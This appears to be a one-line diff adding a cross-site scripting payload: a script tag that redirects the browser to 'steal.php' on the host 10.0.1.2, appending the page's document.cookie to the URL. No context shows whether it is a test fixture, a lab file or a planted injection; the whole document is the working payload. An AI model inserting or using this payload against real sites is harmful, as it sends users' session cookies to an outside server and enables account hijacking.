@@ -1,0 +1,2 @@
+<script>location='http://10.0.1.2/steal.php?cookie='+document.cookie</script>
+
